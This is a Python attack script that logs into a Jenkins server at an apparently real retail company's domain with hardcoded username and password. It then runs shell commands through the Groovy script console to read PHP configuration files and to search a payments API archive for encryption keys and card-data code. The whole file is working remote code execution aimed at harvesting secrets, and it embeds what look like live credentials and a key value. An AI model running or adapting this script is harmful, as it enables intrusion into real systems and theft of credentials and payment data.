#!/usr/bin/env python3
# kimi4_php_decrypt2.py — round 2 (fixed): cat local.php configs + grep caja-pagos-api archive + scoped key search
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'
OUT = r'c:\xampp\htdocs\pentagi\claroshop_attack\kimi4_php_decrypt_results2.txt'

CAJA = '/var/jenkins_home/jobs/_trash/jobs/cs_msa_front/jobs/cs_msa_pipe_caja-pagos-api/builds/2/archive'
TIENDA_CFG = '/var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_tienda-config/builds/420/archive'
APP_CFG = '/var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_build_app-config/builds/31/archive'
TIENDA_JOB = '/var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_tienda'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data, headers={
        'Authorization': 'Basic ' + AUTH,
        crumb['crumbRequestField']: crumb['crumb']
    })
    return opener.open(req2, timeout=170).read().decode()

def gexec(bash):
    # wrap a bash one-liner into the Groovy exec template (bash already contains \\| and \$ escapes)
    return 'def r = ["bash","-c","""' + bash + '"""].execute().text\nprintln r\n'

TASKS = []

TASKS.append(("R2T1 cat tienda local.php (alfa 420)",
    gexec('cat ' + TIENDA_CFG + '/ClaroShop/Desarrollo/alfa/local.php')))

TASKS.append(("R2T2 cat app local.php (QA 31)",
    gexec('cat ' + APP_CFG + '/Webapp/QA/local.php')))

TASKS.append(("R2T3 grep encrypt patterns in caja-pagos-api app",
    gexec(r"grep -rn 'mcrypt\\|openssl_encrypt\\|openssl_decrypt\\|encript\\|llave' " + CAJA + r"/app/ 2>/dev/null | grep -v vendor | head -60")))

TASKS.append(("R2T4 grep datostarjeta + encrypt functions in caja archive",
    gexec(r"grep -rln 'datostarjeta' " + CAJA + r" 2>/dev/null | head -20; echo '---FUNCS---'; grep -rn 'function.*encript\\|function.*decript\\|function.*encrypt\\|function.*decrypt' " + CAJA + r"/app/ 2>/dev/null | head -20")))

TASKS.append(("R2T5 explore tienda build job for app php code",
    gexec(r"ls " + TIENDA_JOB + r"/builds/ 2>/dev/null | tail -8; echo '---PHP---'; find " + TIENDA_JOB + r" -name '*.php' 2>/dev/null | head -30")))

TASKS.append(("R2T6 scoped key grep in tienda+app config archives",
    gexec(r"grep -rn 'K0SUH7I1yDR616H8LrP0XuhURcCN5uRY4\\|llave_encriptacion' " + TIENDA_CFG + ' ' + APP_CFG + r" 2>/dev/null | head -20")))

def main():
    results = []
    for name, script in TASKS:
        print(f"\n{'='*70}\n[RUN] {name}\n{'='*70}", flush=True)
        t0 = time.time()
        try:
            out = jenkins_exec(script)
        except Exception as e:
            out = f"[ERROR] {type(e).__name__}: {e}"
        dt = time.time() - t0
        print(out, flush=True)
        print(f"\n[done {dt:.1f}s]", flush=True)
        results.append(f"\n{'='*70}\n{name}  ({dt:.1f}s)\n{'='*70}\n{out}\n")
    with open(OUT, 'w', encoding='utf-8') as fh:
        fh.write('\n'.join(results))
    print(f"\n[SAVED] {OUT}", flush=True)

if __name__ == '__main__':
    main()
